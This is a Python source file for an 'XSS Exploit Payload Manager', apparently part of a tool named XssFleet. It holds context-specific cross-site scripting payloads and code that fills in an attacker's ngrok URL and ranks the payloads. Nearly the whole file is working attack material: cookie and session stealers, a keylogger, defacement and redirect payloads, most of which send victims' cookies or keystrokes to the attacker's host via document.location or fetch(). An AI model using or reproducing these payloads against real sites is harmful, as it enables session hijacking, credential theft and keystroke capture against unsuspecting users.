"""
XSS Exploit Payload Manager
Manage various XSS attack payloads, generate appropriate attack code based on vulnerability context
"""

from typing import Dict, List, Optional


class PayloadManager:
    def __init__(self):
        self.context_payloads = {
            'html': {
                'description': 'HTML tag context',
                'steal_cookie': [
                    '<script>document.location="NGROK_URL/cookie?c="+document.cookie;</script>',
                    '<img src=x onerror="this.src=\'NGROK_URL/cookie?c=\'+document.cookie">',
                    '<svg onload="document.location=\'NGROK_URL/cookie?c=\'+document.cookie">'
                ],
                'steal_session': [
                    '<script>fetch("NGROK_URL/session",{method:"POST",body:JSON.stringify({cookie:document.cookie,url:location.href})})</script>',
                    '<img src=x onerror="fetch(\'NGROK_URL/session\',{method:\'POST\',body:JSON.stringify({c:document.cookie})})">'
                ],
                'keylogger': [
                    '<script>document.onkeypress=function(e){fetch("NGROK_URL/keylog?k="+String.fromCharCode(e.which))}</script>'
                ],
                'deface': [
                    '<script>document.body.innerHTML="<h1>Hacked by XssFleet</h1>";</script>'
                ],
                'redirect': [
                    '<script>location.href="NGROK_URL/redirect";</script>',
                    '<meta http-equiv="refresh" content="0;url=NGROK_URL/redirect">'
                ],
                'alert_test': [
                    '<script>alert("XSS by XssFleet");</script>',
                    '<img src=x onerror="alert(\'XSS\')">'
                ]
            },
            'attribute': {
                'description': 'HTML attribute context (needs tag closure)',
                'steal_cookie': [
                    '"><script>document.location="NGROK_URL/cookie?c="+document.cookie;</script>',
                    '"><img src=x onerror="this.src=\'NGROK_URL/cookie?c=\'+document.cookie">',
                    '" onerror="document.location=\'NGROK_URL/cookie?c=\'+document.cookie',
                    '"><svg onload="document.location=\'NGROK_URL/cookie?c=\'+document.cookie">'
                ],
                'steal_session': [
                    '"><script>fetch("NGROK_URL/session",{method:"POST",body:JSON.stringify({c:document.cookie})});</script>',
                    '"><img src=x onerror="fetch(\'NGROK_URL/session\',{method:\'POST\',body:JSON.stringify({c:document.cookie})})">'
                ],
                'keylogger': [
                    '"><script>document.onkeypress=function(e){fetch("NGROK_URL/keylog?k="+String.fromCharCode(e.which))}</script>'
                ],
                'deface': [
                    '"><script>document.body.innerHTML="<h1>Hacked</h1>";</script>'
                ],
                'redirect': [
                    '"><script>location.href="NGROK_URL/redirect";</script>',
                    '" autofocus onfocus="location.href=\'NGROK_URL/redirect\'"'
                ],
                'alert_test': [
                    '"><script>alert("XSS");</script>',
                    '" onerror="alert(\'XSS\')"',
                    '" onfocus="alert(\'XSS\')" autofocus'
                ]
            },
            'javascript': {
                'description': 'JavaScript code context',
                'steal_cookie': [
                    '";document.location="NGROK_URL/cookie?c="+document.cookie;"',
                    '";fetch("NGROK_URL/session",{method:"POST",body:JSON.stringify({c:document.cookie})});"',
                    "';document.location='NGROK_URL/cookie?c='+document.cookie;'"
                ],
                'steal_session': [
                    '";fetch("NGROK_URL/session",{method:"POST",body:JSON.stringify({cookie:document.cookie,url:location.href})});"',
                    "';fetch(\"NGROK_URL/session\",{method:\"POST\",body:JSON.stringify({c:document.cookie})});'"
                ],
                'keylogger': [
                    '";document.onkeypress=function(e){fetch("NGROK_URL/keylog?k="+String.fromCharCode(e.which))};'
                ],
                'deface': [
                    '";document.body.innerHTML="<h1>Hacked</h1>";'
                ],
                'redirect': [
                    '";location.href="NGROK_URL/redirect";',
                    "';location='NGROK_URL/redirect';"
                ],
                'alert_test': [
                    '";alert("XSS");',
                    "';alert(\\'XSS\\');"
                ]
            },
            'dom_based': {
                'description': 'DOM manipulation context',
                'steal_cookie': [
                    'javascript:document.location="NGROK_URL/cookie?c="+document.cookie',
                    '"><img src=x onerror="document.location=\'NGROK_URL/cookie?c=\'+document.cookie">',
                    '";document.location="NGROK_URL/cookie?c="+document.cookie;'
                ],
                'steal_session': [
                    'javascript:fetch("NGROK_URL/session",{method:"POST",body:JSON.stringify({c:document.cookie})})',
                    '"><img src=x onerror="fetch(\'NGROK_URL/session\',{method:\'POST\',body:JSON.stringify({c:document.cookie})})">'
                ],
                'keylogger': [
                    'javascript:document.onkeypress=function(e){fetch("NGROK_URL/keylog?k="+String.fromCharCode(e.which))}'
                ],
                'deface': [
                    'javascript:document.body.innerHTML="<h1>Hacked</h1>"'
                ],
                'redirect': [
                    'javascript:location.href="NGROK_URL/redirect"'
                ],
                'alert_test': [
                    'javascript:alert("XSS")',
                    '"><img src=x onerror="alert(\'XSS\')">'
                ]
            },
            'url_param': {
                'description': 'URL parameter context',
                'steal_cookie': [
                    '"><script>document.location="NGROK_URL/cookie?c="+document.cookie;</script>',
                    'javascript:document.location="NGROK_URL/cookie?c="+document.cookie',
                    '"><img src=x onerror="document.location=\'NGROK_URL/cookie?c=\'+document.cookie">'
                ],
                'steal_session': [
                    '"><script>fetch("NGROK_URL/session",{method:"POST",body:JSON.stringify({c:document.cookie})});</script>',
                    'javascript:fetch("NGROK_URL/session",{method:"POST",body:JSON.stringify({c:document.cookie})})'
                ],
                'keylogger': [
                    '"><script>document.onkeypress=function(e){fetch("NGROK_URL/keylog?k="+String.fromCharCode(e.which))}</script>',
                    'javascript:document.onkeypress=function(e){fetch("NGROK_URL/keylog?k="+String.fromCharCode(e.which))}'
                ],
                'deface': [
                    '"><script>document.body.innerHTML="<h1>Hacked</h1>";</script>',
                    'javascript:document.body.innerHTML="<h1>Hacked</h1>"'
                ],
                'redirect': [
                    '"><script>location.href="NGROK_URL/redirect";</script>',
                    'javascript:location.href="NGROK_URL/redirect"'
                ],
                'alert_test': [
                    '"><script>alert("XSS");</script>',
                    'javascript:alert("XSS")',
                    '"><img src=x onerror="alert(\'XSS\')">'
                ]
            }
        }

        self.attack_types = {
            'steal_cookie': {
                'name': 'Cookie Stealer',
                'description': 'Steal target user cookie information'
            },
            'steal_session': {
                'name': 'Session Hijack',
                'description': 'Steal full session information (Cookie + others)'
            },
            'keylogger': {
                'name': 'Keylogger',
                'description': 'Record target user keystrokes'
            },
            'deface': {
                'name': 'Defacement',
                'description': 'Modify target page content'
            },
            'redirect': {
                'name': 'Redirection',
                'description': 'Redirect users to malicious site'
            },
            'alert_test': {
                'name': 'Alert Test',
                'description': 'Popup for vulnerability verification (harmless test)'
            }
        }

    def get_contexts(self) -> List[str]:
        """Get all context types"""
        return list(self.context_payloads.keys())

    def get_attack_types(self) -> List[str]:
        """Get all attack types"""
        return list(self.attack_types.keys())

    def generate_payload(self, attack_type: str, context: str, ngrok_url: str, index: int = 0) -> Optional[str]:
        """
        Generate attack payload based on attack type and context
        :param attack_type: Attack type (steal_cookie, steal_session, etc.)
        :param context: Vulnerability context (html, attribute, javascript, dom_based, url_param)
        :param ngrok_url: ngrok public URL
        :param index: Index of payload of same type (0 is recommended)
        """
        if attack_type not in self.attack_types:
            return None

        context_payloads = self.context_payloads.get(context, self.context_payloads['html'])
        payloads = context_payloads.get(attack_type, context_payloads['steal_cookie'])

        if index >= len(payloads):
            index = 0

        payload = payloads[index]
        return payload.replace('NGROK_URL', ngrok_url)

    def generate_all_payloads(self, attack_type: str, context: str, ngrok_url: str) -> List[str]:
        """
        Generate all attack payloads suitable for this context
        :return: payload list
        """
        if attack_type not in self.attack_types:
            return []

        context_payloads = self.context_payloads.get(context, self.context_payloads['html'])
        payloads = context_payloads.get(attack_type, [])

        return [p.replace('NGROK_URL', ngrok_url) for p in payloads]

    def list_payloads(self) -> Dict:
        """List all available payloads"""
        return self.attack_types

    def get_payload_info(self, attack_type: str) -> Optional[Dict]:
        """Get payload info for specified type"""
        return self.attack_types.get(attack_type)

    def suggest_context(self, xss_context: str) -> str:
        """
        Suggest payload context based on detected XSS context
        :param xss_context: Detected context (html, dom_based, javascript, etc.)
        :return: Recommended payload context
        """
        mapping = {
            'html': 'html',
            'dom': 'dom_based',
            'dom_based': 'dom_based',
            'javascript': 'javascript',
            'attribute': 'attribute',
            'style': 'html',
            'url': 'url_param',
            'comment': 'html'
        }
        return mapping.get(xss_context.lower(), 'html')

    def suggest_payloads(self, xss_context: str, attack_type: str, ngrok_url: str) -> List[Dict]:
        """
        Suggest multiple available payloads based on XSS context and attack type
        :return: [{'payload': '...', 'context': '...', 'description': '...'}]
        """
        suggested_context = self.suggest_context(xss_context)
        payloads = self.generate_all_payloads(attack_type, suggested_context, ngrok_url)

        results = []
        for i, p in enumerate(payloads):
            results.append({
                'payload': p,
                'context': suggested_context,
                'priority': i + 1,
                'description': f"Recommended #{i+1}" if i == 0 else f"Alternative #{i+1}"
            })

        if suggested_context != 'attribute' and suggested_context != 'html':
            alt_contexts = ['attribute', 'html']
            for ctx in alt_contexts:
                alt_payloads = self.generate_all_payloads(attack_type, ctx, ngrok_url)
                for j, p in enumerate(alt_payloads[:1]):
                    results.append({
                        'payload': p,
                        'context': ctx,
                        'priority': len(results) + 1,
                        'description': f"Alternative #{len(results)+1} ({ctx})"
                    })

        return results


def test():
    """Test payload generation"""
    pm = PayloadManager()

    print("="*60)
    print("XSS Payload Manager - Test")
    print("="*60)

    contexts = ['html', 'attribute', 'javascript', 'dom_based', 'url_param']
    attack_type = 'steal_cookie'
    test_url = 'https://test.ngrok.io'

    for ctx in contexts:
        print(f"\n[{ctx}] Context:")
        payloads = pm.generate_all_payloads(attack_type, ctx, test_url)
        for i, p in enumerate(payloads[:2], 1):
            print(f"  {i}. {p[:80]}...")

    print("\n" + "="*60)
    print("Recommend payloads based on detected vulnerability context:")
    print("="*60)

    suggestions = pm.suggest_payloads('attribute', 'steal_cookie', test_url)
    for s in suggestions[:4]:
        print(f"\n[{s['description']}]")
        print(f"  Context: {s['context']}")
        print(f"  Payload: {s['payload'][:80]}...")


if __name__ == '__main__':
    test()
